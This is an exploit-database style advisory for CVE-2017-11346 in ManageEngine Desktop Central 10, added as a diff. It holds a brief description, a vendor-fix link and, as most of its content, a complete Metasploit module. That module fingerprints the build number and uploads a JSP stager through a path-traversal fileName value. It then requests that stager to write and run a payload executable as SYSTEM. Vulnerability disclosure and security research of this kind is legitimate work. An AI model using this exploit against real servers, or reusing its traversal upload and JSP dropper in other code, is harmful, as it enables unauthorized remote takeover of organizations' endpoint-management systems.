@@ -1,0 +1,230 @@
+# Exploit Title: ManageEngine Desktop Central 10 Build 100087 RCE
+# Date: 24-07-2017
+# Software Link: https://www.manageengine.com/products/desktop-central/
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# CVE: CVE-2017-11346
+# Category: remote
+ 
+1. Description
+   
+When uploading a file, the `FileUploadServlet` class does not check the user-controlled `fileName` parameter using `hasVulnerabilityInFileName` function.
+
+This allows a remote attacker to create a malicious file and place it under a directory that allows server-side scripts to run, which results in remote code execution under the context of SYSTEM.
+ 
+https://security.szurek.pl/manageengine-desktop-central-10-build-100087-rce.html
+   
+2. Proof of Concept
+ 
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'nokogiri'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "ManageEngine Desktop Central 10 FileUploadServlet fileName RCE Vulnerability",
+      'Description'    => %q{
+        This module exploits a vulnerability found in ManageEngine Desktop Central 10. When
+        uploading a file, the FileUploadServlet class does not check the user-controlled
+        fileName parameter. This allows a remote attacker to create a malicious file and place
+        it under a directory that allows server-side scripts to run,
+        which results in remote code execution under the context of SYSTEM.
+
+        This exploit was successfully tested on version 10, build 100087.
+
+        Exploit code based on https://www.exploit-db.com/exploits/38982/
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [ 'Kacper Szurek' ],
+      'References'     =>
+        [
+          [ 'URL', 'https://security.szurek.pl/manageengine-desktop-central-10-build-100087-rce.html' ]
+        ],
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [ 'ManageEngine Desktop Central 10 on Windows', {} ]
+        ],
+      'Payload'        =>
+        {
+          'BadChars' => "\x00"
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => "July 24 2017",
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path for ManageEngine Desktop Central', '/']),
+        Opt::RPORT(8020)
+      ], self.class)
+  end
+
+  def jsp_drop_bin(bin_data, output_file)
+    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
+    jspraw << %Q|<%\n|
+    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|
+
+    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|
+
+    jspraw << %Q|int numbytes = data.length();\n|
+
+    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
+    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
+    jspraw << %Q|{\n|
+    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
+    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
+    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
+    jspraw << %Q|  comb <<= 4;\n|
+    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
+    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
+    jspraw << %Q|}\n|
+
+    jspraw << %Q|outputstream.write(bytes);\n|
+    jspraw << %Q|outputstream.close();\n|
+    jspraw << %Q|%>\n|
+
+    jspraw
+  end
+
+  def jsp_execute_command(command)
+    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
+    jspraw << %Q|<%\n|
+    jspraw << %Q|try {\n|
+    jspraw << %Q|  Runtime.getRuntime().exec("chmod +x #{command}");\n|
+    jspraw << %Q|} catch (IOException ioe) { }\n|
+    jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
+    jspraw << %Q|%>\n|
+
+    jspraw
+  end
+
+  def get_jsp_stager
+    exe = generate_payload_exe(code: payload.encoded)
+    jsp_fname = "#{Rex::Text.rand_text_alpha(5)}.jsp"
+
+    register_files_for_cleanup("../webapps/DesktopCentral/jspf/#{jsp_fname}")
+
+    {
+      jsp_payload: jsp_drop_bin(exe, jsp_fname) + jsp_execute_command(jsp_fname),
+      jsp_name:    jsp_fname
+    }
+  end
+
+  def get_build_number(res)
+    inputs = res.get_hidden_inputs
+    inputs.first['buildNum']
+  end
+
+  def get_html_title(res)
+    html = res.body
+    n = ::Nokogiri::HTML(html)
+    x = n.xpath('//title').text
+  end
+
+  def check
+    uri = normalize_uri(target_uri.path, '/configurations.do')
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => uri
+    })
+
+    unless res
+      print_error("Connection timed out")
+      return Exploit::CheckCode::Unknown
+    end
+
+    build_number = get_build_number(res)
+    if build_number.to_s.empty?
+      print_error("Cannot find build number")
+    else
+      print_status("Found build number: #{build_number}")
+    end
+    
+    html_title   = get_html_title(res)
+
+    if html_title.to_s.empty?
+      print_error("Cannot find title")
+    else
+      print_status("Found title: #{html_title}")
+    end
+   
+    if build_number.to_i <= 100087
+      return Exploit::CheckCode::Appears
+    elsif /ManageEngine Desktop Central 10/ === html_title
+      return Exploit::CheckCode::Detected
+    end
+
+
+    Exploit::CheckCode::Safe
+  end
+
+  def upload_jsp(stager_info)
+    uri = normalize_uri(target_uri.path, 'fileupload')
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'     => uri,
+      'ctype'     => 'application/octet-stream',
+      'encode_params' => false,
+      'data'      => stager_info[:jsp_payload],
+      'vars_get'    => {
+        'action'    => 'HelpDesk_video',
+        'computerName'  => Rex::Text.rand_text_alpha(rand(10)+5),
+        'resourceId'  => 1,
+        'customerId'  => 1,
+        'fileName'    => "\\..\\..\\..\\..\\jspf\\#{stager_info[:jsp_name]}"
+      }
+    })
+
+    if res.nil?
+      fail_with(Failure::Unknown, "Connection timed out while uploading to #{uri}")
+    elsif res && res.code != 200
+      fail_with(Failure::Unknown, "The server returned #{res.code}, but 200 was expected.")
+    end
+  end
+
+  def exec_jsp(stager_info)
+    uri = normalize_uri(target_uri.path, "/jspf/#{stager_info[:jsp_name]}")
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => uri
+    })
+
+    if res.nil?
+      fail_with(Failure::Unknown, "Connection timed out while executing #{uri}")
+    elsif res && res.code != 200
+      fail_with(Failure::Unknown, "Failed to execute #{uri}. Server returned #{res.code}")
+    end
+  end
+
+  def exploit
+    print_status("Creating JSP stager")
+    stager_info = get_jsp_stager
+
+    print_status("Uploading JSP stager #{stager_info[:jsp_name]}...")
+    upload_jsp(stager_info)
+
+    print_status("Executing stager...")
+    exec_jsp(stager_info)
+  end
+
+end
+   
+3. Solution:
+   
+https://www.manageengine.com/products/desktop-central/remote-code-execution.html
